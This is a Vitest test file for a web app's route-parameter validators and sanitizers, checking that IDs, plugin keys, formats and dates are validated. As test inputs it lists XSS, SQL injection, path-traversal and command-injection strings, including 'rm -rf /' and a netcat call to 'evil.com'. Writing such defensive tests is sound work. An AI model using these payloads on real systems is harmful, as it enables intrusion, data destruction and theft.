import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import {
  validateNumericId,
  validateStringParam,
  sanitizeStringParam,
  sanitizeItemName,
  sanitizeText,
  validateReceiptId,
  validatePluginKey,
  validateFormat,
  validateDateParam,
  handleValidationError,
  useRouteValidation,
  type RouteValidationResult
} from '../routeValidation'

describe('routeValidation utilities', () => {
  let consoleErrorSpy: ReturnType<typeof vi.spyOn>
  let consoleWarnSpy: ReturnType<typeof vi.spyOn>

  beforeEach(() => {
    consoleErrorSpy = vi.spyOn(console, 'error').mockImplementation(() => {})
    consoleWarnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {})
  })

  afterEach(() => {
    consoleErrorSpy.mockRestore()
    consoleWarnSpy.mockRestore()
  })

  describe('validateNumericId', () => {
    describe('valid numeric IDs', () => {
      it('should validate positive integers', () => {
        // Arrange
        const validIds = ['1', '42', '123456', '999999']

        // Act & Assert
        validIds.forEach(id => {
          const result = validateNumericId(id)
          expect(result.isValid).toBe(true)
          expect(result.value).toBe(Number(id))
          expect(result.error).toBeUndefined()
        })
      })

      it('should handle string numbers with whitespace', () => {
        // Arrange
        const idsWithSpaces = ['  123  ', '\n456\n', '\t789\t']

        // Act & Assert
        idsWithSpaces.forEach(id => {
          const result = validateNumericId(id)
          expect(result.isValid).toBe(true)
          expect(result.value).toBe(Number(id.trim()))
        })
      })

      it('should respect minimum value constraints', () => {
        // Arrange
        const options = { min: 10 }

        // Act & Assert
        expect(validateNumericId('15', options).isValid).toBe(true)
        expect(validateNumericId('10', options).isValid).toBe(true)
        expect(validateNumericId('9', options).isValid).toBe(false)
      })

      it('should respect maximum value constraints', () => {
        // Arrange
        const options = { max: 100 }

        // Act & Assert
        expect(validateNumericId('50', options).isValid).toBe(true)
        expect(validateNumericId('100', options).isValid).toBe(true)
        expect(validateNumericId('101', options).isValid).toBe(false)
      })

      it('should handle negative numbers when allowed', () => {
        // Arrange
        const options = { allowNegative: true, min: -100 }

        // Act & Assert
        expect(validateNumericId('-50', options).isValid).toBe(true)
        expect(validateNumericId('-1', options).isValid).toBe(true)
        expect(validateNumericId('-101', options).isValid).toBe(false)
      })

      it('should handle zero correctly', () => {
        // Arrange
        const options = { min: 0 }

        // Act & Assert
        expect(validateNumericId('0', options).isValid).toBe(true)
        expect(validateNumericId('0').isValid).toBe(false) // Default min is 1
      })
    })

    describe('invalid numeric IDs', () => {
      it('should reject null and undefined', () => {
        // Act & Assert
        expect(validateNumericId(null as any).isValid).toBe(false)
        expect(validateNumericId(undefined).isValid).toBe(false)
      })

      it('should reject empty strings', () => {
        // Act & Assert
        expect(validateNumericId('').isValid).toBe(false)
        expect(validateNumericId('   ').isValid).toBe(false)
      })

      it('should reject array parameters', () => {
        // Act
        const result = validateNumericId(['1', '2'])

        // Assert
        expect(result.isValid).toBe(false)
        expect(result.error).toBe('ID parameter cannot be an array')
      })

      it('should reject non-numeric strings', () => {
        // Arrange
        const invalidIds = ['abc', 'test123', '123abc', 'not-a-number']

        // Act & Assert
        invalidIds.forEach(id => {
          const result = validateNumericId(id)
          expect(result.isValid).toBe(false)
          expect(result.error).toBe('ID parameter must be a valid number')
        })
      })

      it('should reject decimal numbers', () => {
        // Arrange
        const decimalIds = ['1.5', '123.456', '0.1']

        // Act & Assert
        decimalIds.forEach(id => {
          const result = validateNumericId(id)
          expect(result.isValid).toBe(false)
          expect(result.error).toBe('ID parameter must be an integer')
        })
      })

      it('should reject negative numbers when not allowed', () => {
        // Act & Assert
        const result = validateNumericId('-1')
        expect(result.isValid).toBe(false)
        expect(result.error).toBe('ID parameter cannot be negative')
      })

      it('should reject dangerous characters', () => {
        // Arrange
        const dangerousIds = [
          '1<script>alert(1)</script>',
          '1; DROP TABLE users;',
          '1/../../../etc/passwd',
          '1%3Cscript%3E',
          '1|rm -rf /'
        ]

        // Act & Assert
        dangerousIds.forEach(id => {
          const result = validateNumericId(id)
          expect(result.isValid).toBe(false)
          expect(result.error).toBe('ID parameter contains invalid characters')
        })
      })

      it('should handle very large numbers', () => {
        // Arrange
        const veryLargeNumber = (Number.MAX_SAFE_INTEGER + 1).toString()

        // Act
        const result = validateNumericId(veryLargeNumber, { max: Number.MAX_SAFE_INTEGER })

        // Assert
        expect(result.isValid).toBe(false)
        expect(result.error).toContain('cannot exceed')
      })

      it('should handle Infinity and NaN strings', () => {
        // Act & Assert
        expect(validateNumericId('Infinity').isValid).toBe(false)
        expect(validateNumericId('NaN').isValid).toBe(false)
        expect(validateNumericId('-Infinity').isValid).toBe(false)
      })
    })

    describe('edge cases', () => {
      it('should handle scientific notation', () => {
        // Act & Assert
        expect(validateNumericId('1e5').isValid).toBe(false) // Not an integer
        expect(validateNumericId('1E10').isValid).toBe(false)
      })

      it('should handle octal and hex notation', () => {
        // Act & Assert
        expect(validateNumericId('0123').isValid).toBe(true) // Treated as decimal 123 (leading zeros are allowed)
        expect(validateNumericId('0xFF').isValid).toBe(false) // Invalid hex notation
      })
    })
  })

  describe('validateStringParam', () => {
    describe('valid strings', () => {
      it('should validate basic strings', () => {
        // Arrange
        const validStrings = ['hello', 'world', 'test123', 'plugin-name']

        // Act & Assert
        validStrings.forEach(str => {
          const result = validateStringParam(str)
          expect(result.isValid).toBe(true)
          expect(result.value).toBe(str)
        })
      })

      it('should trim whitespace', () => {
        // Act
        const result = validateStringParam('  hello  ')

        // Assert
        expect(result.isValid).toBe(true)
        expect(result.value).toBe('hello')
      })

      it('should validate against allowed patterns', () => {
        // Arrange
        const options = { allowedPattern: /^[a-z]+$/ }

        // Act & Assert
        expect(validateStringParam('hello', options).isValid).toBe(true)
        expect(validateStringParam('Hello', options).isValid).toBe(false)
        expect(validateStringParam('hello123', options).isValid).toBe(false)
      })

      it('should validate against allowed values', () => {
        // Arrange
        const options = { allowedValues: ['plugin1', 'plugin2', 'plugin3'] }

        // Act & Assert
        expect(validateStringParam('plugin1', options).isValid).toBe(true)
        expect(validateStringParam('plugin4', options).isValid).toBe(false)
      })

      it('should handle case insensitive allowed values', () => {
        // Arrange
        const options = {
          allowedValues: ['Plugin1', 'Plugin2'],
          caseSensitive: false
        }

        // Act & Assert
        expect(validateStringParam('plugin1', options).isValid).toBe(true)
        expect(validateStringParam('PLUGIN2', options).isValid).toBe(true)
        expect(validateStringParam('plugin3', options).isValid).toBe(false)
      })

      it('should respect length constraints', () => {
        // Arrange
        const options = { minLength: 5, maxLength: 10 }

        // Act & Assert
        expect(validateStringParam('hello', options).isValid).toBe(true)
        expect(validateStringParam('helloworld', options).isValid).toBe(true)
        expect(validateStringParam('hi', options).isValid).toBe(false)
        expect(validateStringParam('verylongstring', options).isValid).toBe(false)
      })
    })

    describe('invalid strings', () => {
      it('should reject null and undefined', () => {
        // Act & Assert
        expect(validateStringParam(null as any).isValid).toBe(false)
        expect(validateStringParam(undefined).isValid).toBe(false)
      })

      it('should reject empty strings', () => {
        // Act & Assert
        expect(validateStringParam('').isValid).toBe(false)
        expect(validateStringParam('   ').isValid).toBe(false)
      })

      it('should reject array parameters', () => {
        // Act
        const result = validateStringParam(['str1', 'str2'])

        // Assert
        expect(result.isValid).toBe(false)
        expect(result.error).toBe('String parameter cannot be an array')
      })

      it('should reject strings with dangerous characters', () => {
        // Arrange
        const dangerousStrings = [
          '<script>alert(1)</script>',
          'test; DROP TABLE users;',
          '../../../etc/passwd',
          'test%3Cscript%3E',
          'test|rm -rf /',
          'test&echo dangerous'
        ]

        // Act & Assert
        dangerousStrings.forEach(str => {
          const result = validateStringParam(str)
          expect(result.isValid).toBe(false)
          expect(result.error).toBe('String parameter contains invalid characters')
        })
      })

      it('should reject strings that do not match allowed pattern', () => {
        // Arrange
        const options = { allowedPattern: /^[a-zA-Z0-9-_]+$/ }

        // Act & Assert
        expect(validateStringParam('valid-name_123', options).isValid).toBe(true)
        expect(validateStringParam('invalid@name', options).isValid).toBe(false)
        expect(validateStringParam('invalid name', options).isValid).toBe(false)
      })
    })
  })

  describe('sanitization functions', () => {
    describe('sanitizeStringParam', () => {
      it('should remove dangerous characters', () => {
        // Act & Assert
        expect(sanitizeStringParam('test<script>')).toBe('test')
        expect(sanitizeStringParam('test"quote')).toBe('testquote')
        expect(sanitizeStringParam('test|pipe')).toBe('testpipe')
        expect(sanitizeStringParam('test../path')).toBe('testpath')
        expect(sanitizeStringParam('test%20encoded')).toBe('testencoded')
      })

      it('should trim whitespace', () => {
        // Act
        const result = sanitizeStringParam('  test  ')

        // Assert
        expect(result).toBe('test')
      })

      it('should handle empty input', () => {
        // Act & Assert
        expect(sanitizeStringParam('')).toBe('')
        expect(sanitizeStringParam('   ')).toBe('')
      })

      it('should remove control characters', () => {
        // Arrange
        const inputWithControlChars = 'test\x00\x01\x1F\x7F'

        // Act
        const result = sanitizeStringParam(inputWithControlChars)

        // Assert
        expect(result).toBe('test')
      })
    })

    describe('sanitizeItemName', () => {
      it('should preserve legitimate product name characters', () => {
        // Arrange
        const legitimateNames = [
          'Coffee & Tea Set',
          'Café Americano',
          'Product #123',
          'Size: 12" x 8"',
          'Brand™ Product'
        ]

        // Act & Assert
        legitimateNames.forEach(name => {
          const result = sanitizeItemName(name)
          // Should preserve most characters while removing dangerous ones
          expect(result.length).toBeGreaterThan(0)
          expect(result).not.toContain('<script')
          expect(result).not.toContain('javascript:')
        })
      })

      it('should remove dangerous script tags', () => {
        // Act & Assert
        expect(sanitizeItemName('Product<script>alert(1)</script>Name')).toBe('ProductName')
        expect(sanitizeItemName('Item<iframe src="evil"></iframe>Description')).toBe('ItemDescription')
        expect(sanitizeItemName('Testjavascript:alert(1)')).toBe('Test')
      })

      it('should remove event handlers', () => {
        // Act & Assert
        expect(sanitizeItemName('Product onclick=alert(1) Name')).toBe('Product Name')
        expect(sanitizeItemName('Item onmouseover=evil() Description')).toBe('Item Description')
      })

      it('should preserve international characters', () => {
        // Arrange
        const internationalNames = [
          'Café Français',
          'Продукт название',
          '商品名称',
          'プロダクト名'
        ]

        // Act & Assert
        internationalNames.forEach(name => {
          const result = sanitizeItemName(name)
          expect(result).toBe(name) // Should be unchanged
        })
      })
    })

    describe('sanitizeText', () => {
      it('should remove all dangerous HTML tags', () => {
        // Act & Assert
        expect(sanitizeText('Text<script>alert(1)</script>More')).toBe('TextMore')
        expect(sanitizeText('Text<iframe src="bad"></iframe>More')).toBe('TextMore')
        expect(sanitizeText('Text<object data="bad"></object>More')).toBe('TextMore')
        expect(sanitizeText('Text<embed src="bad">More')).toBe('TextMore')
      })

      it('should remove dangerous protocols', () => {
        // Act & Assert
        expect(sanitizeText('Click javascript:alert(1) here')).toBe('Click here')
        expect(sanitizeText('Run vbscript:msgbox("bad") code')).toBe('Run code')
      })

      it('should preserve legitimate text formatting', () => {
        // Arrange
        const legitimateText = 'This is a normal sentence with punctuation! And numbers: 123.'

        // Act
        const result = sanitizeText(legitimateText)

        // Assert
        expect(result).toBe(legitimateText)
      })

      it('should handle multiline text', () => {
        // Arrange
        const multilineText = 'Line 1\nLine 2\rLine 3\r\nLine 4'

        // Act
        const result = sanitizeText(multilineText)

        // Assert
        expect(result).toContain('\n')
        expect(result).toContain('\r')
      })
    })
  })

  describe('specific validators', () => {
    describe('validateReceiptId', () => {
      it('should validate positive receipt IDs', () => {
        // Act & Assert
        expect(validateReceiptId('123').isValid).toBe(true)
        expect(validateReceiptId('1').isValid).toBe(true)
        expect(validateReceiptId('999999').isValid).toBe(true)
      })

      it('should reject zero and negative IDs', () => {
        // Act & Assert
        expect(validateReceiptId('0').isValid).toBe(false)
        expect(validateReceiptId('-1').isValid).toBe(false)
      })
    })

    describe('validatePluginKey', () => {
      it('should validate known plugin keys', () => {
        // Arrange
        const validKeys = [
          'category-analytics',
          'price-trends',
          'generic-receipts',
          'amazon-receipts',
          'generic-receipt',
          'amazon'
        ]

        // Act & Assert
        validKeys.forEach(key => {
          expect(validatePluginKey(key).isValid).toBe(true)
        })
      })

      it('should handle case insensitive plugin keys', () => {
        // Act & Assert
        expect(validatePluginKey('AMAZON').isValid).toBe(true)
        expect(validatePluginKey('Generic-Receipt').isValid).toBe(true)
      })

      it('should reject unknown plugin keys', () => {
        // Act & Assert
        expect(validatePluginKey('unknown-plugin').isValid).toBe(false)
        expect(validatePluginKey('malicious-key').isValid).toBe(false)
      })

      it('should reject plugin keys with invalid characters', () => {
        // Act & Assert
        expect(validatePluginKey('plugin@key').isValid).toBe(false)
        expect(validatePluginKey('plugin key').isValid).toBe(false)
        expect(validatePluginKey('plugin.key').isValid).toBe(false)
      })
    })

    describe('validateFormat', () => {
      it('should validate known export formats', () => {
        // Arrange
        const validFormats = ['csv', 'json', 'xlsx', 'pdf']

        // Act & Assert
        validFormats.forEach(format => {
          expect(validateFormat(format).isValid).toBe(true)
        })
      })

      it('should handle case insensitive formats', () => {
        // Act & Assert
        expect(validateFormat('CSV').isValid).toBe(true)
        expect(validateFormat('Json').isValid).toBe(true)
        expect(validateFormat('XLSX').isValid).toBe(true)
      })

      it('should reject unknown formats', () => {
        // Act & Assert
        expect(validateFormat('txt').isValid).toBe(false)
        expect(validateFormat('doc').isValid).toBe(false)
        expect(validateFormat('unknown').isValid).toBe(false)
      })
    })

    describe('validateDateParam', () => {
      it('should validate proper date format', () => {
        // Arrange
        const validDates = ['2023-01-01', '2023-12-31', '2024-02-29'] // Leap year

        // Act & Assert
        validDates.forEach(date => {
          expect(validateDateParam(date).isValid).toBe(true)
        })
      })

      it('should reject invalid date formats', () => {
        // Arrange
        const invalidFormats = [
          '2023/01/01', // Wrong separator
          '01-01-2023', // Wrong order
          '2023-1-1', // Missing zeros
          '23-01-01', // Two digit year
          '2023-13-01', // Invalid month
          '2023-01-32' // Invalid day
        ]

        // Act & Assert
        invalidFormats.forEach(date => {
          expect(validateDateParam(date).isValid).toBe(false)
        })
      })

      it('should reject dates outside acceptable range', () => {
        // Act & Assert
        expect(validateDateParam('1999-12-31').isValid).toBe(false) // Too old

        // Future date test (more than 1 year ahead)
        const futureYear = new Date().getFullYear() + 2
        expect(validateDateParam(`${futureYear}-01-01`).isValid).toBe(false)
      })

      it('should reject invalid dates that match format', () => {
        // Act & Assert
        expect(validateDateParam('2023-02-30').isValid).toBe(false) // Feb 30th doesn't exist
        expect(validateDateParam('2023-04-31').isValid).toBe(false) // April 31st doesn't exist
      })

      it('should reject array parameters', () => {
        // Act
        const result = validateDateParam(['2023-01-01', '2023-01-02'])

        // Assert
        expect(result.isValid).toBe(false)
        expect(result.error).toBe('Date parameter cannot be an array')
      })
    })
  })

  describe('handleValidationError', () => {
    it('should handle validation errors with router redirect', () => {
      // Arrange
      const mockRouter = {
        replace: vi.fn()
      }
      const failedResult: RouteValidationResult = {
        isValid: false,
        error: 'Test error'
      }

      // Act & Assert
      expect(() => {
        handleValidationError(failedResult, mockRouter, '/error')
      }).toThrow('Invalid route parameter detected')

      expect(mockRouter.replace).toHaveBeenCalledWith('/error')
      expect(consoleErrorSpy).toHaveBeenCalledWith('Route parameter validation failed:', 'Test error')
      expect(consoleWarnSpy).toHaveBeenCalledWith(
        'Potential route parameter injection attempt detected:',
        'Test error'
      )
    })

    it('should use default fallback route when none provided', () => {
      // Arrange
      const mockRouter = {
        replace: vi.fn()
      }
      const failedResult: RouteValidationResult = {
        isValid: false,
        error: 'Test error'
      }

      // Act & Assert
      expect(() => {
        handleValidationError(failedResult, mockRouter)
      }).toThrow('Invalid route parameter detected')

      expect(mockRouter.replace).toHaveBeenCalledWith('/')
    })

    it('should not throw or redirect for valid results', () => {
      // Arrange
      const mockRouter = {
        replace: vi.fn()
      }
      const validResult: RouteValidationResult = {
        isValid: true,
        value: 123
      }

      // Act & Assert
      expect(() => {
        handleValidationError(validResult, mockRouter)
      }).not.toThrow()

      expect(mockRouter.replace).not.toHaveBeenCalled()
    })
  })

  describe('useRouteValidation composable', () => {
    it('should return all validation functions', () => {
      // Act
      const composable = useRouteValidation()

      // Assert
      expect(typeof composable.validateReceiptId).toBe('function')
      expect(typeof composable.validatePluginKey).toBe('function')
      expect(typeof composable.validateFormat).toBe('function')
      expect(typeof composable.validateDateParam).toBe('function')
      expect(typeof composable.validateNumericId).toBe('function')
      expect(typeof composable.validateStringParam).toBe('function')
      expect(typeof composable.sanitizeStringParam).toBe('function')
      expect(typeof composable.sanitizeItemName).toBe('function')
      expect(typeof composable.sanitizeText).toBe('function')
      expect(typeof composable.handleValidationError).toBe('function')
    })

    it('should provide working validation functions', () => {
      // Arrange
      const { validateReceiptId, validatePluginKey } = useRouteValidation()

      // Act & Assert
      expect(validateReceiptId('123').isValid).toBe(true)
      expect(validatePluginKey('amazon').isValid).toBe(true)
    })
  })

  describe('security and edge cases', () => {
    it('should handle SQL injection with comments', () => {
      // Test specific SQL injection patterns that might be tricky
      const sqlPatterns = ['admin\'/*', 'admin\'#', '/**/UNION/**/SELECT/**/']

      sqlPatterns.forEach(pattern => {
        expect(validateStringParam(pattern).isValid).toBe(false)
        expect(validateNumericId(pattern).isValid).toBe(false)
      })
    })

    it('should handle XML and data URL injections', () => {
      expect(validateStringParam('<?xml version="1.0"?><root>evil</root>').isValid).toBe(false)
      expect(validateStringParam('data:text/html,<script>alert(1)</script>').isValid).toBe(false)
    })

    it('should handle various injection attempts', () => {
      // Test each injection attempt individually so we can see which ones pass
      expect(validateStringParam("1'; DROP TABLE users; --").isValid).toBe(false)
      expect(validateStringParam('1 OR 1=1').isValid).toBe(false)
      expect(validateStringParam('1 UNION SELECT * FROM secrets').isValid).toBe(false)
      expect(validateStringParam('1<script>alert("XSS")</script>').isValid).toBe(false)
      expect(validateStringParam('1${system("rm -rf /")}').isValid).toBe(false)
      expect(validateStringParam('1`rm -rf /`').isValid).toBe(false)
      expect(validateStringParam('1|nc evil.com 1337').isValid).toBe(false)
      expect(validateStringParam('../../../etc/passwd').isValid).toBe(false)
      expect(validateStringParam('\\\\server\\share\\file').isValid).toBe(false)
      expect(validateStringParam('javascript:alert(document.cookie)').isValid).toBe(false)
      expect(validateStringParam('vbscript:msgbox("XSS")').isValid).toBe(false)
      expect(validateStringParam('\' OR \'1\'=\'1').isValid).toBe(false)
      expect(validateStringParam('\' OR \'a\'=\'a').isValid).toBe(false)
      expect(validateStringParam('\') OR (\'1\'=\'1').isValid).toBe(false)
      expect(validateStringParam('1%27%20OR%20%271%27%3D%271').isValid).toBe(false)
      expect(validateStringParam('1\' OR 1=1--').isValid).toBe(false)
      expect(validateStringParam('1\' OR 1=1#').isValid).toBe(false)
      expect(validateStringParam('1\' OR 1=1/*').isValid).toBe(false)
    })

    it('should handle various encoding attacks', () => {
      // Arrange
      const encodedAttacks = [
        '%3Cscript%3Ealert%281%29%3C%2Fscript%3E',
        '%22%20onmouseover%3D%22alert%281%29',
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
        '\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E',
        '%0Ajavascript:alert(1)',
        '%0Dvbscript:alert(1)'
      ]

      // Act & Assert
      encodedAttacks.forEach(attack => {
        expect(validateStringParam(attack).isValid).toBe(false)
      })
    })

    it('should handle unicode and international attacks', () => {
      // Arrange
      const unicodeAttacks = [
        'test\u0000injection', // Null byte
        'test\u000Ainjection', // Line feed
        'test\u000Dinjection', // Carriage return
        'test\u0009injection', // Tab (should be allowed in text but not in params)
        'test\u001Finjection', // Unit separator
        'test\u007Finjection'  // DEL character
      ]

      // Act & Assert
      unicodeAttacks.forEach(attack => {
        expect(validateStringParam(attack).isValid).toBe(false)
        expect(validateNumericId(attack).isValid).toBe(false)
      })
    })

    it('should handle very long inputs', () => {
      // Arrange
      const longString = 'a'.repeat(10000)
      const longNumber = '1'.repeat(1000)

      // Act & Assert
      expect(validateStringParam(longString).isValid).toBe(false) // Exceeds default max
      expect(validateNumericId(longNumber).isValid).toBe(false) // Not a valid number format
    })

    it('should handle special numeric edge cases', () => {
      // Arrange
      const edgeCases = [
        '0x123', // Hex
        '0b101', // Binary
        '0o123', // Octal
        '1.0e10', // Scientific notation
        '1.0E-10', // Scientific notation
        '+123', // Explicit positive
        ' +123 ', // With whitespace
        '123.0', // Decimal zero
        '123.000' // Multiple decimal zeros
      ]

      // Act & Assert
      edgeCases.forEach(edgeCase => {
        const result = validateNumericId(edgeCase)
        // Most should be invalid due to being non-integers or containing invalid chars
        if (result.isValid) {
          expect(Number.isInteger(result.value!)).toBe(true)
        }
      })
    })

    it('should maintain consistent behavior under stress', () => {
      // Arrange
      const testCases = [
        { func: validateNumericId, input: '123' },
        { func: validateStringParam, input: 'test' },
        { func: validateReceiptId, input: '456' },
        { func: validatePluginKey, input: 'amazon' },
        { func: validateFormat, input: 'csv' },
        { func: validateDateParam, input: '2023-01-01' }
      ]

      // Act & Assert - Run multiple times to ensure consistency
      for (let i = 0; i < 100; i++) {
        testCases.forEach(({ func, input }) => {
          const result = func(input)
          expect(result.isValid).toBe(true)
        })
      }
    })
  })
})